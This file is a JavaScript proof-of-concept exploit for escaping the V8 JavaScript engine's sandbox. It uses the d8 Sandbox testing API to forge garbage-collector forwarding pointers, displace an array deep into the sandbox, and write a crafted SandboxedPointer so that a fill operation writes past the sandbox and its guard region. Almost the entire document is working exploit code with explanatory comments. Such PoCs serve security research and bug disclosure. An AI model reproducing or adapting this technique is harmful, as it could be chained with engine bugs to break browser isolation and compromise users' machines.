// V8 Sandbox Escape PoC — SandboxedPointer Overflow via GC-Assisted Object Displacement
// Platform: x86-64 Linux, V8 1 TB sandbox (kSandboxedPointerShift = 24)
//
// Run: ./d8 --run-as-sandbox-security-poc --expose-gc poc.js
//
// Mechanism:
//   1. Displace JSArray `ta` to sandbox offset 292 GB via GC forwarding chain
//      → GetPtrComprCageBase(ta) = sandbox_base + 292 GB
//   2. Write encoded SandboxedPointer 0xffc0000000000000 directly via MemoryView
//      → bypasses WriteSandboxedPointerField CHECK
//   3. Decode: cage_base + (0xffc0000000000000 >> 24) = cage_base + 0xFFC0000000 ≈ +1023 GB
//   4. Write target = sandbox_base + 292 GB + 1023 GB = sandbox_base + 1315 GB
//      sandbox end = sandbox_base + 1024 GB
//      guard end   = sandbox_base + 1312 GB  (288 GB guard)
//      1315 GB > 1312 GB → genuine sandbox VAS violation

const kPageSize = 0x40000;
const kPageMask = ~(BigInt(kPageSize) - 1n);
const kFromPage = 1 << 3; // MemoryChunk::FROM_PAGE

const kTypedArrayType        = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kExternalPointerOffset = Sandbox.getFieldOffset(kTypedArrayType, 'external_pointer');
const kBasePointerOffset     = Sandbox.getFieldOffset(kTypedArrayType, 'base_pointer');

const cageView = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getBackingStoreOffset(ab) {
  const ta = new Uint8Array(ab);
  const addr = Sandbox.getAddressOf(ta);
  return cageView.getBigUint64(addr + kExternalPointerOffset, true) >> 24n;
}

function writeU32(addr, val) {
  const addrBi = BigInt(addr);
  const pageOffset = Number(addrBi & 0xfffn);
  const baseOffset = Number(addrBi - BigInt(pageOffset));
  new DataView(new Sandbox.MemoryView(baseOffset, 0x1000))
    .setUint32(pageOffset, val >>> 0, true);
}

function writeU64(addr, val) {
  const addrBi = BigInt(addr);
  const pageOffset = Number(addrBi & 0xfffn);
  const baseOffset = Number(addrBi - BigInt(pageOffset));
  new DataView(new Sandbox.MemoryView(baseOffset, 0x1000))
    .setBigUint64(pageOffset, BigInt(val), true);
}

function getDv(addr) {
  const o = Number(BigInt(addr) & 0xfffn), b = Number(BigInt(addr) - BigInt(o));
  return [new DataView(new Sandbox.MemoryView(b, 0x1000)), o];
}
function readBytes(addr, len) {
  const [dv, o] = getDv(addr), r = new Uint8Array(len);
  for (let i = 0; i < len; i++) r[i] = dv.getUint8(o + i);
  return r;
}
function writeBytes(addr, bytes) {
  const [dv, o] = getDv(addr);
  for (let i = 0; i < bytes.length; i++) dv.setUint8(o + i, bytes[i]);
}

// ── waypoint collection ───────────────────────────────────────────────────────
const buffers = [];
const waypoints = [];
const templateTa = new Uint8Array(64);

for (let i = 0; i < 8; i++) {
  try {
    const ab = new ArrayBuffer(0x7fe00000);
    buffers.push(ab);
    const a = (getBackingStoreOffset(ab) + 0x3ffffn) & kPageMask;
    waypoints.push(a + 0x100n);
  } catch(e) {}
}
for (let i = 0; i < 6; i++) {
  try {
    const r = new ArrayBuffer(0x80000, {maxByteLength: 0x80000000});
    buffers.push(r);
    const a = (getBackingStoreOffset(r) + 0x3ffffn) & kPageMask;
    waypoints.push(a + 0x100n);
    waypoints.push(a + 0x3f000n);
  } catch(e) {}
}
for (let i = 0; i < 80; i++) {
  try {
    const r = new ArrayBuffer(0x80000, {maxByteLength: 0x100000000});
    buffers.push(r);
    const a = (getBackingStoreOffset(r) + 0x3ffffn) & kPageMask;
    waypoints.push(a + 0x100n);
    waypoints.push(a + 0x3f000n);
  } catch(e) {}
}

gc();
const templateAddr  = Sandbox.getAddressOf(templateTa);
const templateBytes = readBytes(templateAddr, 64);
waypoints.sort((a, b) => (a < b ? -1 : a > b ? 1 : 0));

function step(currentAddr, diff, isFirst) {
  if (!isFirst) writeU32(currentAddr & kPageMask, kFromPage);
  writeU32(currentAddr, (Number(diff / 4n)) << 1);
}

// ── main ─────────────────────────────────────────────────────────────────────
function main() {
  let ta = [1.1, 2.2, 3.3];
  let cur = BigInt(Sandbox.getAddressOf(ta));
  // 73 × 4 GB = 292 GB  →  cage_base = sandbox_base + 292 GB
  // decoded target = cage_base + 0xFFC0000000 ≈ +1023 GB
  // total from sandbox_base = 1315 GB > sandbox(1024) + guard(288) = 1312 GB ✓
  const kTargetOffset = 73n * 0x100000000n;
  let isFirst = true;

  while (cur < kTargetOffset) {
    let next = -1n;
    for (const wp of waypoints) {
      const diff = wp - cur;
      if (diff > 0n && diff <= 0xfffffc00n && (diff & 3n) === 0n) next = wp;
    }
    if (next === -1n) break;
    step(cur, next - cur, isFirst);
    isFirst = false;
    gc({type: 'minor'});
    cur = next;
  }

  print(`[+] ta displaced → sandbox+0x${cur.toString(16)} (${(Number(cur)/2**30).toFixed(1)} GB)`);
  print(`[+] cage_base = sandbox_base + ${(Number(cur & ~0xffffffffn)/2**30).toFixed(0)} GB`);

  writeBytes(cur, templateBytes);
  writeU32(cur + BigInt(kBasePointerOffset), 0);
  writeU64(cur + BigInt(kExternalPointerOffset), 0xffc0000000000000n);

  print(`[+] Forged external_pointer = 0xffc0000000000000`);
  print(`    decoded target = cage_base + 0xFFC0000000 ≈ 1315 GB from sandbox_base`);
  print(`    sandbox+guard ends at 1312 GB → 3 GB outside ✓`);
  print(`[*] Triggering ta.fill(0x41) → expect V8 sandbox violation...`);

  ta.fill(0x41);  // → SEGV_MAPERR outside sandbox VAS
}

main();
